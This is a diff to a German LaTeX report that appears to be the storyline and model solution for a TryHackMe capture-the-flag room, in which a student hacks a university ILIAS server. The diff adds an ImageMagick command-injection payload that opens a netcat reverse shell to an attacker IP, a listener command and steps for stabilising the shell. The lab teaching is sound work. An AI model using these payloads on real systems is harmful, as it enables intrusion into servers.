@@ -62,7 +62,8 @@
     stringstyle=\color{mauve},
     breaklines=true,
     breakatwhitespace=true,
-    tabsize=3
+    tabsize=2
+    numbers=left
 }
 
 
@@ -171,9 +172,13 @@
 
         \vspace{0.5cm}
         \hline
-        \vspace{3cm}
+        \vspace{5cm}
         \noindent
         \keywords{Ilias, Fehlkonfiguration, ImageMagick, Privilage Escalation, XSS}
+
+        \vspace{3cm}
+        \noindent
+        Für Zugang zum Git-Repository oder bei Fragen und Anregungen melden Sie sich bitte untern den angegebene Mail-Adressen der Autorenschaft.
     \end{abstract}
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -181,11 +186,11 @@
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
 
-    \shorttoc{Inhaltsübersicht}{1}
-    \pagebreak
-    \tableofcontents
-    \vfill
-    \pagebreak
+%    \shorttoc{Inhaltsübersicht}{1}
+%    \pagebreak
+     \tableofcontents
+     \vfill
+     \pagebreak
 
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -381,7 +386,7 @@
     \fill
     \newpage
 
-    \section{Storyline}
+    \section{Storyline und Musterlösung}
     \label{sec:storyline}
     Hier geht es zum \href{https://tryhackme.com/jr/t1mth3h4ck3rb0y}{\textbf{TryHackMe Raum}}.\vspace{0.5cm}
     \\
@@ -414,18 +419,16 @@
 
 
 
-    %Bilder vom TryHackMe Raum einfügen
-
     \subsection{Virtuelle Maschine 1}
     \label{subsec:vm1}
 
     \subsection{Virtuelle Maschine 2}
     \label{subsec:vm2}
-    TimDerHackerboy in sicher erfolgreich durch die \ac{vm}1 gekämpft und seine Note geändert.
-    Seine Spuren hat er erfolgreich verwischt und sogar Credentials für eine neue ILIAS Version gefunden, die durch Administratoren der Hochschule gerade aufgesetzt wird.
+    Nachdem TimDerHackerboy sicher erfolgreich durch die \ac{vm}1 gekämpft hat und sogar Credentials für neue ILIAS Version 5.2.3 in die Finger bekam, wird es Zeit für eine neue Aufgabe.
+    Die neue ILIAS Version wird durch Administratoren der Hochschule gerade neu aufgesetzt und ist noch nicht für die Studenten zugänglich.
     Die Verantwortlichen der Hochschule, zu denen auch der Professor SuperSicherAndi zählt, entschieden sich so die bekannte XSS Schachstelle aus Version 5.2.3 zu beheben.
-    Tim wäre kein Hackerboy würde er sich nicht direkt an die Arbeit machen und den Administratoren zeigen, dass sie ihre Arbeit nicht richtig machen.
-    So könnte er Professor SuperSicherAndi beweisen, dass er die eins auf jeden Fall verdient hat, sollte dieser ihm trotz aller Vorsichtsmaßnahmen auf die Schliche kommen.
+    Doch Tims Nachname wäre nicht Hackerboy, würde er sich nicht direkt an die Arbeit machen und den Administratoren zeigen, dass sie ihre Arbeit nicht richtig machen.
+    So könnte er Professor SuperSicherAndi sicher überzeugen, dass er die eins auf jeden Fall verdient hat, sollte dieser ihm trotz aller Vorsichtsmaßnahmen auf die Schliche kommen.
 
     \subsubsection{ImageMagick Schwachstelle finden und Payload erstellen}
     \label{subsubsec:imageMagickFinden}
@@ -463,23 +466,59 @@
     \\
     Dieser Exlpoit zeigt nach dem Ausführen eine Liste aller Dateien und Verzeichnisse im aktuellen Verzeichnis als Profilbild an.
     Das ist Tim jedoch nicht genug, er möchte eine Reverse Shell.
-    Hacking \textcite{reverseShell} zeigt ein Beispiel für eine Netcat Reverse Shell: \textit{nc 192.168.100.113 4444 –e /bin/bash}.
+    Hacking \textcite{reverseShell} zeigt ein Beispiel für eine Netcat Reverse Shell: \textit{nc Ziel-IP Port –e /bin/bash}.
     Es gilt abschließend den in~\ref{lst:imageMagickExploit} beschriebene Exploit um die Netcat Reverse Shell ergänzen.
-    Das der fertige Exploit ausgeführt wird ist darauf zurückzuführen, dass ImageMagick versucht das Dateiformat anhand des Inhalts festzustellen.
+    Das der Exploit ausgeführt wird, ist darauf zurückzuführen, dass ImageMagick versucht das Dateiformat anhand des Inhalts festzustellen.
     \vspace{0.4cm}
     \begin{lstlisting}[label={lst:imageMagickExploitFinal}]
-        #Als .txt bearbeiten un in akzeptiertem Dateiformat speichern
+        #Als .txt bearbeiten und in einem akzeptiertem Dateiformat speichern
+        #Lokale IP und Zielport tauschen
         push graphic-context
         viewbox 0 0 640 480
-        fill 'url(https://example.com/image.jpg"|nc 10.39.0.127 4444 "-e/bin/bash '
+        fill 'url(https://example.com/image.jpg"|nc 10.101.0.137 4444 "-e/bin/bash '
         pop graphic-context
     \end{lstlisting}
     \vspace{0.3cm}
 
-    \subsubsection{Verbindung mittels Reverse Shell herstellen}
+    \subsubsection{Verbindung mittels Reverse Shell herstellen und stabilisieren}
     \label{subsubsec:verbindunHerstellen}
+    Im nächsten Schritt gilt es mittels dem in~\ref{subsubsec:imageMagickFinden} erstellten Exploit eine Verbindung zum Server herzustellen.
+    Dazu muss Tim einen Netcat Listener erstellen, der den durch den Exploit angestoßenen Verbindungsversuch entgegennimmt.
+    Das kann mittels des nc Befehls wie folgt erreicht werden: \textit{nc -lvnp zielIP zielport}.
+    Wird nun der Exploit als Profilbild gespeichert,
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/VerbindungDa}
+        \caption{Der Exploit wird als Profilbild gespeichert und ein Netcat Lister nimmt den Verbindungsversuch des Servers auf Port 444 entgegen.}
+        \label{fig:exploitHochladen}
+    \end{figure}
+    \noindent
+    Nach, dem die Verbindung erfolgreich etabliert ist, kommt schon das nächste Problem auf Tim zu.
+    Die Bash Shell ist zu instabil um damit fortzufahren.
+    Um die Shell zu stabilisieren, beschreibt ~\textcite{shellStabilisieren} folgendes Vorgehen:
+
+    \begin{enumerate}[leftmargin=2.5cm]
+        \item[1] \textit{python -c 'import pty; pty.spawn("/bin/bash")'}  in der Konsole eingeben.
+        \item[2] \textit{Strg+z}  drücken, um die Shell als Hintergrundprozess zu betreiben und wieder zur lokalen Maschine zu gelangen.
+        \item[3] \textit{stty raw -echo;fg}  in der Konsole eingeben, um die Einstellung für die Kommandozeile festzulegen und die Shell nicht mehr als Hintergrundprozess zu betreiben.
+        \item[4] \textit{export TERM=xterm}  in der Konsole eingeben, um den Terminalemulator auf xterm zu setzen.
+    \end{enumerate}
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/shellStabilisierenGanz}
+        \caption{Stabile Bash Shell nach Durführung der oben genannten Schritte}
+        \label{fig:shellStabilisiert}
+    \end{figure}
+    \noindent
 
 
+
+
+
+
+    \subsubsection{Privilege Escalation}
+    \label{subsubsec:privilegeEscalation}
 
 
 
